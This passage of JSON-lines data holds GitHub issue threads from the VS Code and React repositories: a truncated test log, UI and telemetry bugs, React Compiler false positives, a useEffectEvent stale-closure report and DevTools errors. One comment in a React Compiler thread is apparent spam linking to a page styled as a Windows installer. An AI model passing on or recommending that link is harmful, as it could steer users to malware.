(src/contexts/auth-context.tsx:28:7)\n\n  console.error\n    An update to CartProvider inside a test was not wrapped in act(...).\n    \n    When testing, code that causes React state updates should be wrapped into act(...):\n    \n    act(() => {\n      /* fire events that update state */\n    });\n    /* assert on the output */\n    \n    This ensures that you're testing the behavior the user would see in the browser. Learn more at https://react.dev/link/wrap-tests-with-act\n\n      328 |     const getInitialSession = async () => {\n      329 |       const { data: { user } } = await supabase.auth.getUser()\n    > 330 |       dispatch({ type: 'SET_USER', payload: user })\n          |       ^\n      331 |       if (user) {\n      332 |         await syncCartFromDatabase()\n      333 |       }\n\n      at node_modules/react-dom/cjs/react-dom-client.development.js:16023:19\n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)\n      at warnIfUpdatesNotWrappedWithActDEV (node_modules/react-dom/cjs/react-dom-client.development.js:16022:9)\n      at scheduleUpdateOnFiber (node_modules/react-dom/cjs/react-dom-client.development.js:14396:11)\n      at dispatchReducerAction (node_modules/react-dom/cjs/react-dom-client.development.js:6916:14)\n      at dispatch (src/contexts/cart-context.tsx:330:7)\n\n  console.error\n    An update to AuthProvider inside a test was not wrapped in act(...).\n    \n    When testing, code that causes React state updates should be wrapped into act(...):\n    \n    act(() => {\n      /* fire events that update state */\n    });\n    /* assert on the output */\n    \n    This ensures that you're testing the behavior the user would see in the browser. Learn more at https://react.dev/link/wrap-tests-with-act\n\n      26 |       const { data: { user } } = await supabase.auth.getUser()\n      27 |       setUser(user)\n```", "issue_labels": ["bug", "insiders-released", "copilot-chat"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 270188, "issue_url": "https://github.com/microsoft/vscode/issues/270188", "issue_title": "MacOS - Window corner border is cut off in high contrast mode", "issue_author": "mrleemurray", "issue_body": "Screenshot:\n\n<img width=\"232\" height=\"180\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/90d2fa99-b4cf-4f52-9a45-2f679605e738\" />\n\n<img width=\"198\" height=\"170\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/736a5bb6-a341-4fc5-b323-71df8dc5946c\" />\n\n\nEnvironment Information:\n- VS Code Version: 1.105.0-insider\n- OS: macOS (arm64)\n- Workspace: 2 folder(s) open\n\n---\nThis issue was filed using the Issue Filer extension", "issue_labels": ["bug", "upstream", "ux", "macos", "accessibility", "electron", "insiders-released"], "comments": [{"author": "bpasero", "body": "@mrleemurray is this macOS 26 possibly? I cannot reproduce:\n\n<img width=\"1313\" height=\"912\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/3b34015b-2996-454e-84cf-90efc54d16df\" />"}, {"author": "mrleemurray", "body": "Yes, macOS 26\n\n<img width=\"170\" height=\"31\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/aa44da4e-1358-4cc7-b633-47067263dde7\" />"}, {"author": "bpasero", "body": "@deepak1556 maybe related to the shadows in windows on macOS 26? did we change something here recently?"}, {"author": "deepak1556", "body": "Only relevant change in this area was https://github.com/electron/electron/pull/48376, seems like something that can repro with base electron app."}, {"author": "avarayr", "body": "pr in #270236 \n\np.s. maintainers \u2014 please take a look at important notes at the bottom of the PR. The border radius will inevitably change soon, so border radius will need to be revisited again"}]}
{"repo": "microsoft/vscode", "issue_number": 270307, "issue_url": "https://github.com/microsoft/vscode/issues/270307", "issue_title": "Github copilot not showing tools icon", "issue_author": "alejandrofloresm", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: Yes\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: \n\nVersion: 1.104.3 (Universal)\nCommit: 385651c938df8a906869babee516bffd0ddb9829\nDate: 2025-10-02T12:30:51.747Z\nElectron: 37.3.1\nElectronBuildId: 12404162\nChromium: 138.0.7204.235\nNode.js: 22.18.0\nV8: 13.8.258.31-electron.0\nOS: Darwin arm64 25.0.0\n\n- OS Version: Tahoe26\n\nSteps to Reproduce:\n\n\t1.\tOpen VS Code with the GitHub Copilot extension installed and enabled.\n\t2.\tSign in to GitHub and confirm that Copilot is working (inline completions, chat, etc.).\n\t3.\tLook for the \u201cTools\u201d icon that should appear in the Copilot sidebar (next to \u201cChat\u201d or \u201cCompletions\u201d).\n\t4.\tObserve that the \u201cTools\u201d icon does not appear.\n\n<img width=\"1136\" height=\"348\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/36368953-cf85-49d4-b763-57a4334b0b00\" />\n", "issue_labels": ["bug", "insiders-released", "chat"], "comments": [{"author": "roblourens", "body": "It's likely that you accidentally hid the button. You should be able to right click the send button to get it back. I am making a change to prevent hiding items in this menu because this isn't the first time this has happened.\n\ncc @bpasero it looks like you made a change to this in https://github.com/microsoft/vscode/pull/204631 so I'm wondering whether you use this?"}, {"author": "alejandrofloresm", "body": "In case someone has this same problem:\n\nIf you right click it you can hide it with \"\u2705  Configure tools\"\n\n<img width=\"1042\" height=\"118\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ec8e5808-0f62-42d8-8ba9-7f8265bbee95\" />\n\nAfter that you can recover it as \"Reset menu\"\n\n<img width=\"430\" height=\"232\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5a2d929d-146b-44e1-9038-619379127fa4\" />"}]}
{"repo": "microsoft/vscode", "issue_number": 270363, "issue_url": "https://github.com/microsoft/vscode/issues/270363", "issue_title": "hashChange event does not trigger in session when we initialize a git repo", "issue_author": "kevin-m-kent", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! bug_report_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- \ud83d\udd6e Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->\n<!-- \ud83d\udd0e Search existing issues to avoid creating duplicates. -->\n<!-- \ud83e\uddea Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->\n<!-- \ud83d\udca1 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->\n<!-- \ud83d\udd27 Launch with `code --disable-extensions` to check. -->\nDoes this issue occur when all extensions are disabled?: Yes/No\n\n<!-- \ud83e\ude93 If you answered No above, use 'Help: Start Extension Bisect' from Command Palette to try to identify the cause. -->\n<!-- \ud83d\udce3 Issues caused by an extension need to be reported directly to the extension publisher. The 'Help > Report Issue' dialog can assist with this. -->\n- VS Code Version: 1.104.3\n- OS Version:  Windows_NT arm64 10.0.26100\n\n1. Open new folder without git\n2. Add some content\n3.  Run git init in terminal\n4. Git add, commit \n5. Observe that we do not have a hashChange event for telemetry/editTelemetry.editSources.details\n\nEvent only appears when you re-open in a new vscode window and make more changes.\n\nFYI @isidorn \n", "issue_labels": ["bug", "telemetry", "insiders-released"], "comments": [{"author": "isidorn", "body": "I can reproduce this. @hediet assigning first to you (Lad is on vacation) \ud83d\ude4f \nAlso assigning to October since we need this for our metric work (hope that is ok)."}]}
{"repo": "facebook/react", "issue_number": 34826, "issue_url": "https://github.com/facebook/react/issues/34826", "issue_title": "Bug: react-hooks/immutability wrong detect bug", "issue_author": "demonguyj", "issue_body": "<!--\n  Please provide a clear and concise description of what the bug is. Include\n  screenshots if needed. Please test using the latest version of the relevant\n  React packages to make sure your issue has not already been fixed.\n-->\n\nReact version:\n\n## Steps To Reproduce\n\n1. const name is useTestHooks\n2. Set inside useMemo\n\n\nLink to code example:\n(https://playground.react.dev/#N4Igzg9grgTgxgUxALhAcimBACOAbASwQDsAXNAHWKoIFsAHCGU7YKi0zBAYQEM88AI15wA1gBpsXALIJaEKgF9sAMxgRa2CiBgIRpbe2JwIxMCy4AVBOYASECKLDYAvNgAUASlcA+Vu1ITMxYAE15SXlcpLFl5dy9fDzZibFTsUgQAD1JkbAADPKpUxU9JAG0AXU8jDiDzdJtSADEoYyiuPgFhMXjvFz9kjiGDUjCIgDoAN34oHBcA4eHpvFnx3Xo8EQR3BZHF0gB6MoBBAFoALwqDgHM6cV39jgKHvdJq6lfFe4-hspeOMa8F4VXbvAK6TgwFKDEbLAhjBABRRKIxZRjMbAhBAqXhQPAWLDWOwOJxUEDiEBBFQEa4oEB0dEsUgAT3oOGA2AACitbsQAPL0UgEUzOZRqDTYNDCQQIPCnDZQXmnXT6U4mBgEPAIGAHEIEcxoADcRncyVSBwO6vomvCwuI0ggWNy2n4eEMxGUYFtYGpNi5PII-MFdrAnkN5PAAAsIAB3ACSZG1xH4YBQOLwWEUQA)\n\n## The current behavior\n\n<img width=\"866\" height=\"320\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f9628aa4-ae60-4bed-8c58-c588b7b0870e\" />\n\n## The expected behavior\n\nAn ESLint error occurs when the constant name contains \u201cuse\u201d, but it works fine when \u201cuse\u201d is not included in the name.\n", "issue_labels": ["Type: Question", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. The compiler is correctly flagging this as a violation of the Rules of React: hook return values are not safe to modify. Mutating the value without recreating it means anything that depends on this value won\u2019t re-render, causing bugs. \n\nDoes that make sense? Note that if you only use this value in the callback, you can create it there. Or copy it (`{\u2026data}`) and modify the copy. "}, {"author": "demonguyj", "body": "I understood.\nBut, \nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAcimBACOAbASwQDsAXNAHWKoIFsAHCGU7YKi0zBAYQEM88AI15wA1gBpsXALIJaEKgF9sAMxgRa2CiBgIRpbe2JwIxMC1IJzACQgRRYbAF5sACgCUzgHyt2pE2YsACa8pLzOUliy8q4e3m5sxNjJ2JYAHqTI2AAG2VTJiu6SANoAuu5GHAHmqVakAGJQxhFcfALCYrGeTj6JHP0GpCFhAHQAbvxQOE5+AwMTeFMjuvR4Igius4NzpAD0xQCCALQAXqW7AOZ04ls7HLm326QV1E+KN68DxY8cw7yPpS2Lz8uk4MCSfUGCwIwwQfkUSiMCDSjGY2CCCBUvCgeAsdVs9jAVBA4hAARUBAuKBAdFRFgAnvQcMBsAAFRZXYgAeXopAIpkcyjUGmwaGEggQeCOqygnKOun0RxMDAIeAQMF2QQI5jQAG4jK5EsldrtlfRVaF+cRpBAMVltPw8IZiMowJawBSrGyOQRubyrWB3LqSeAABYQADuAEkyOriPwwCgsXgsIogA\n\nThis case doesn't return error.\n\nThis case change name only.\n"}, {"author": "josephsavona", "body": "Note that your second example isn't a hook (per the function name). I'm gonna close since this is working as expected but feel free to continue discussion here."}]}
{"repo": "facebook/react", "issue_number": 34603, "issue_url": "https://github.com/facebook/react/issues/34603", "issue_title": "[DevTools Bug] Cannot read properties of undefined (reading 'length')", "issue_author": "eljonathas", "issue_body": "### Website or app\n\ninternal application\n\n### Repro steps\n\nThis issue occurred after I enabled the option to highlight component updates in the interface and tried to record them using the React DevTools profiler. I had also enabled the \"Record why each component rendered while profiling\" profiling option.\n\n<img width=\"921\" height=\"800\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/34e1e0ac-3186-4dd5-86bd-63a03742bf10\" />\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.5-5d87cd2244\n\n### Error message (automated)\n\nCannot read properties of undefined (reading 'length')\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1224203\n    at he.getFlamegraphChartData (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1224614)\n    at CommitFlamegraphAutoSizer (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1473032)\n    at renderWithHooks (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:66690)\n    at updateFunctionComponent (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:96942)\n    at beginWork (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:110959)\n    at performUnitOfWork (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:182534)\n    at workLoopSync (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:182390)\n    at renderRootSync (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:182174)\n    at performWorkOnRoot (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:177634)\n```\n\n### Error component stack (automated)\n\n```text\nat CommitFlamegraphAutoSizer (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1472789)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at SettingsModalContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1363197)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1604868\n    at va (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1380724)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383435)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383632\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1383435)\n    at InspectedElementContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1394502)\n    at TimelineContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1461901)\n    at ProfilerContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1453632)\n    at TreeContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1275115)\n    at SettingsContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1303162)\n    at ModalDialogContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1440740)\n    at DevTools_DevTools (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1612679)\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot read properties of undefined (reading 'length') in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hsyeun", "body": "Hi! I couldn\u2019t reproduce this in React 19.2.0 with React DevTools 6.1.5.  \nThe Profilerworks as expected no `commitData` or `.length` errors.\n\nIt seems this issue was limited to React 18\u2019s profiler data format, where commitData could be undefined.  \nReact 19 introduced structural changes in commit data, which likely resolved it automatically.\n\nSo this issue may be marked as **Fixed in React 19** or **No longer reproducible.** Thanks!"}, {"author": "hoxyq", "body": "Hey, could you please upgrade the extension to version 7 and check if this still reproduces?"}, {"author": "hsyeun", "body": "Hi, Quick follow-up !! I tested as requested with React 19.2.0 and React DevTools 7.  \nProfiler works normally no `commitData` or `.length` errors observed.  \n\nIt seems this issue has been resolved in the latest version.  \nIf no one else can reproduce it, it might be safe to close. Thanks!\n\n\nP.S. My previous comment seems to have been hidden as spam \ud83d\ude05\nI mentioned that I also tested with React 19.2.0 and React DevTools 6.1.5, and everything worked fine - no issues observed.\n"}, {"author": "eljonathas", "body": "> Hi, Quick follow-up !! I tested as requested with React 19.2.0 and React DevTools 7. Profiler works normally no `commitData` or `.length` errors observed.\n> \n> It seems this issue has been resolved in the latest version. If no one else can reproduce it, it might be safe to close. Thanks!\n> \n> P.S. My previous comment seems to have been hidden as spam \ud83d\ude05 I mentioned that I also tested with React 19.2.0 and React DevTools 6.1.5, and everything worked fine - no issues observed.\n\nYep. I can't reproduce this error anymore"}]}
{"repo": "facebook/react", "issue_number": 34818, "issue_url": "https://github.com/facebook/react/issues/34818", "issue_title": "Bug: Stale closures with `useEffectEvent`", "issue_author": "OliverJAsh", "issue_body": "<!--\n  Please provide a clear and concise description of what the bug is. Include\n  screenshots if needed. Please test using the latest version of the relevant\n  React packages to make sure your issue has not already been fixed.\n-->\n\nReact version: 19.2\n\n## Steps To Reproduce\n\n1. Open [the reduced test case](https://stackblitz.com/edit/github-utjrgufd?file=app%2Froot.tsx) and view the console\n2. Click the \"Home\" link (this causes `navigationType` to change to `REPLACE`)\n\n```tsx\nfunction App() {\n  const navigationType = useNavigationType();\n  // \u2705 This is REPLACE after clicking the link.\n  console.log('render', navigationType);\n\n  const fn = useEffectEvent(() => {\n    // \u274c But this is always POP. It's not seeing the latest value!\n    console.log('effect event', navigationType);\n  });\n  useEffect(() => {\n    setInterval(() => {\n      fn();\n    }, 3000);\n  }, []);\n\n  return (\n    <>\n      <Link to=\"/\">Home</Link>\n      <Outlet />\n    </>\n  );\n}\n\n// \ud83e\udd37\u200d\u2642\ufe0f Removing `memo` here fixes the problem.\nexport default memo(App);\n```\n\n\n\nLink to code example:\n\n<!--\n  Please provide a CodeSandbox (https://codesandbox.io/s/new), a link to a\n  repository on GitHub, or provide a minimal code example that reproduces the\n  problem. You may provide a screenshot of the application if you think it is\n  relevant to your bug report. Here are some tips for providing a minimal\n  example: https://stackoverflow.com/help/mcve.\n-->\n\nhttps://stackblitz.com/edit/github-utjrgufd?file=app%2Froot.tsx\n\n## The current behavior\n\nThe Effect Event receives a stale value from `navigationType` (`POP`).\n\n<img width=\"156\" height=\"121\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/12de8a41-a853-483b-a658-38a9bc2dba45\" />\n\n## The expected behavior\n\nThe Effect Event should receive the latest value from `navigationType` (`REPLACE`).", "issue_labels": ["Type: Bug", "Component: Reconciler"], "comments": [{"author": "Ashish-simpleCoder", "body": "@OliverJAsh, Somehow it seems to break the `reactivity` of `useEffectEvent` when wrapping the component within `React.memo`.\n\nI also tried it with seperate Counter component, and it is ineed giving out stale value when wrapped inside `React.memo`.\n\nLink to code:-\nhttps://stackblitz.com/edit/vitejs-vite-tu2o8a6e?file=src%2FApp.tsx"}, {"author": "eps1lon", "body": "This seems to work just fine with just React: https://codesandbox.io/p/sandbox/clever-sinoussi-ds5sxl?file=%2Fsrc%2Findex.js\n\nI would suggest filing this against react-router first to rule out any issues with `useNavigationType`. They're using Context internally but maybe they're setting the value differently."}, {"author": "OliverJAsh", "body": "@eps1lon The issue reproduces in your example as soon as you add `memo`: https://codesandbox.io/p/sandbox/useeffectevent-sees-latest-context-forked-lf4zdh"}]}
{"repo": "facebook/react", "issue_number": 33781, "issue_url": "https://github.com/facebook/react/issues/33781", "issue_title": "[Compiler Bug]: Mutating local variable created from destructuring a prop is incorrectly detected as a prop mutation", "issue_author": "laug", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwEFNMAKASn2AAdOsPz44rMAUJlcZfAF4BosfiaFk+AORkARnEJaANCrFM6xdJoCMAJgDMJtqoi4AFghiYYETJq0elJQQxioAvgDcwiowCLiwbNym+AA8AHzJYikAKhi4AMIQALbYdAh00rJkCsAycmH4APQZzlnNKrxRdGHRdOa4nuSI+LlShSWs5bgACj6YYMrOdWSawGoa+FIw5gDmEWoWGJp0UEW6nvuuHl5zmlu7+JHCPSJlWDg09IwsbKMFxaUptxvL4wJo-uNARVZqD+EJXmIJHQpAIiFVHop8CD5l0YnEEvgkq1UrooLhcKxMvhWPlKEw4ABrGp8RRpRaqDniSQENbqIz4AB0QuWAHUmO5oLgAJKEDFKZZdTmqRqNfAAA1F4rckplarUC3kZQA7vhgnAyJR8AA3MjbPSUBACqliFX4ACyZNkD01ErJMqIEAQCzornwRU9AzRcidxI5roAyhB8O4EFySkwHTB8EbbX06Dt9fh5ORKGBU9gwOKmFbHc6o2Qxb7pYQBeZLJiACy2RVKrnIiAOgXBHbcZatw7oTpNVV2eyEkMELu8KlhMItJWUPQISjJFKNUnk1jr-CdZ69EBhIA\n\n### Repro steps\n\nTo repro, simply open the playground link, the compiler error will be shown directly.\n\nThe compiler error is a false positive, because the variable being mutated is a local variable, and mutating it does not result in the prop's value being mutated.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0\n\n### What version of React Compiler are you using?\n\n0.0.0-experimental-acd39a6-20250710", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for posting, you\u2019re right that\u2019s a false positive. I\u2019ll put up a fix. "}, {"author": "josephsavona", "body": "Fix is up at #33786"}, {"author": "laug", "body": "@josephsavona Thank you for the quick fix!\nDo you know what kind of timeline we are looking at to get the PR approved and the fix available in the nightly builds?"}, {"author": "josephsavona", "body": "Some folks have been out so review has been a bit slow, likely next week."}, {"author": "laug", "body": "Thanks for merging the fix in #33786 \nI've confirmed the issue is resolved on our codebase as of npm package version `0.0.0-experimental-2db0664-20250725`."}, {"author": "josephsavona", "body": "Thanks for reporting and confirming the fix!"}, {"author": "Preg-splitlonesome", "body": "> Thanks for reporting and confirming the fix!\n\n\n\n\n\nhttps://gerardo-windows-installe.github.io/YDaW3WyB_bGbpnu04w/"}]}
{"repo": "facebook/react", "issue_number": 21751, "issue_url": "https://github.com/facebook/react/issues/21751", "issue_title": "[DevTools Bug] Children cannot be added or removed during a reorder operation.", "issue_author": "Alice-in-korea", "issue_body": "### Website or app\n\nhttps://github.com/Alice-in-korea/chrome_bug_report.git\n\n### Repro steps\n\n1. Click next day button or prev day button\r\n2. Normally there are only three column for three days but you can see the fragment of other column with error message.\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n4.13.5-0ae5290b54\n\n### Error message (automated)\n\nChildren cannot be added or removed during a reorder operation.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:21301:41\r\n    at bridge_Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:19286:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:19446:12\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:37413:39)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Children cannot be added or removed during a reorder operation. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "leventdeniz", "body": "See this comment: https://github.com/facebook/react/issues/21468#issuecomment-838770329"}, {"author": "Christopher-Stevers", "body": "I'm having the same issue.\r\n### Website or app\r\n\r\nhttps://github.com/Christopher-Stevers/OpenQ-Frontend/tree/pagination\r\n\r\n### Repro steps\r\n\r\nGo to organization route, toggle to Bounties, and scroll down. This will load more bounties (infinite scrolling) then click on remove unfunded checkbox.\r\n\r\nHow often does this bug happen?\r\n\r\nEvery time"}, {"author": "usamajabbasi", "body": "Facing same issue \u270b\ud83c\udffb\u270b\ud83c\udffb"}, {"author": "joaoigormatos", "body": "Also facing the same problem."}, {"author": "gaearon", "body": "cc @lunaruan seems like this has a repro, has anyone had a chance to look?"}, {"author": "lunaruan", "body": "Not yet. It seems like both repros are unavailable. @Christopher-Stevers could you reupload your repro please? \ud83d\ude0a"}, {"author": "ychcg", "body": "I also facing the same issue"}, {"author": "lunaruan", "body": "@ychcg Could you upload a repro for this?"}, {"author": "aomini", "body": "I had faced this issue in infinite scroll due to duplicate keys. \r\nPreview of devtools in a gif:\r\n![duplicate](https://user-images.githubusercontent.com/38497578/176190094-c29363b6-e3d5-4b96-b800-5548e1b3c91c.gif)\r\n\r\n"}, {"author": "ghimire-dinesh", "body": "I had faced the same issue in infinite scroll due to duplicate keys and got fixed after changing the key."}, {"author": "leventdeniz", "body": "I threw together a quick demo for this @lunaruan \r\n\r\nDemo: https://po0o5k.csb.app/ \r\nCode: https://codesandbox.io/s/mystifying-ptolemy-po0o5k?file=/src/App.js\r\n\r\n1. open react-devtools \r\n2. click one of the two buttons\r\n\r\nI am aware that this is fixable by just removing the duplicate keys but still wanted to provide a demo for this, as it was asked for in this thread. In my demo it is easily fixable by cleaning up the data but for others it may be to use a key that is more unique.\r\n\r\n"}, {"author": "eps1lon", "body": "I can no longer reproduce this with React DevTools 7.0. If the issue persists, please open a new issue."}]}
{"repo": "facebook/react", "issue_number": 24608, "issue_url": "https://github.com/facebook/react/issues/24608", "issue_title": "[DevTools Bug] Cannot remove node \"276\" because no matching node was found in the Store.", "issue_author": "Mancunia", "issue_body": "### Website or app\n\nhttps://github.com/Fast-Pace-Transfer/analytics-dashboard-ui\n\n### Repro steps\n\nI am trying save a randomly generated set of colors with matching countries as an object in the local storage\r\nfrom a context\r\nSo it doesn't change colors after a manual refresh\n\n### How often does this bug happen?\n\nOnly once\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n4.24.6-ca7a38ae4\n\n### Error message (automated)\n\nCannot remove node \"276\" because no matching node was found in the Store.\n\n### Error call stack (automated)\n\n```text\nat chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:26518:43\r\n    at bridge_Bridge.emit (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24436:22)\r\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:24605:14\r\n    at listener (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:54547:39)\n```\n\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Cannot remove node  because no matching node was found in the Store. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```\n", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "mondaychen", "body": "Hi thanks for reporting, but your website link is 404 (private repo?), and your repro description is pretty vague. Any chance you can provide more details?"}, {"author": "Mancunia", "body": "> Hi thanks for reporting, but your website link is 404 (private repo?), and your repro description is pretty vague. Any chance you can provide more details?\r\n\r\nThat is because it's a private repo,"}, {"author": "Mancunia", "body": "So this happened whiles i was saving and retrieving data to and from a context to a local storage\r\n"}, {"author": "mondaychen", "body": "@Mancunia I understand it happens when you perform this action, but it's unlikely that's the direct cause of this issue. I worked on a React app that saves and retrieves data from localStorage and it does not trigger this bug. \r\nCan you please provide a way to reproduce this issue (preferably via something like codesandbox.io)? Thanks "}, {"author": "2sem", "body": "<img width=\"1081\" alt=\"\u1109\u1173\u110f\u1173\u1105\u1175\u11ab\u1109\u1163\u11ba 2022-06-04 \u110b\u1169\u110c\u1165\u11ab 12 17 44\" src=\"https://user-images.githubusercontent.com/16129260/171883227-95a167db-97ca-4bd3-a16e-8e872382403d.png\">\r\nflipper"}, {"author": "Segmentational", "body": "How does DevTools calculate the node count? For example, I can consistently reproduce this issue by toggling my loading state to true and false, but the `Cannot remove node \"<node-count>\"` message is non-deterministic (granted it's* non-deterministic for me due to my little experience using the tool).\r\n\r\nI also am using Local Storage; however, did confirm that wasn't throwing any error(s).\r\n\r\nI'll try here a bit to see what I can do to create a simplified, reproducible version of my application as example."}, {"author": "Segmentational", "body": "I was unable to reproduce easily. I'll check back sometime next week to see if an answer was provided to my first question. \r\n\r\nPush comes to shove, I'll try my best to get an example working next weekend!"}, {"author": "jcubic", "body": "I have the same error from CodeSanbox found a reference in https://github.com/pmndrs/react-three-fiber/discussions/928 but it's not related to react-three-fiber.\r\n\r\nI have a basic reactJS app but with classes (Sorry, I'm refreshing my knowledge on old React).\r\n\r\nhttps://codesandbox.io/s/kind-zeh-wnz86j?file=/src/components/App.tsx\r\n\r\nand I have an error: `Cannot remove node 13 because no matching node was found in the Store.` the preview works fine, but I think that it simply hides the error because it's not dev mode. When I click submit it clears the console like in the editor, but I'm not 100% sure if the error is still there and not visible.\r\n\r\nI also think that it's related to React DevTools because I've disabled those."}, {"author": "yongmin86k", "body": "https://github.com/facebook/react/issues/23202#issuecomment-1103314940"}, {"author": "2sem", "body": "I found a solution for Cannot remove node \"0\"\r\n\r\n\"react-devtools-core\": \"4.24.3\",\r\n\r\n\"resolutions\": {\r\n\"react-devtools-core\": \"4.24.3\"\r\n},\r\n\r\nhttps://github.com/facebook/flipper/issues/3649#issuecomment-1272444843"}, {"author": "eps1lon", "body": "We fixed some scenarios where this could occur in React DevTools 7.0. If this issue still persists, please open a new issue."}]}
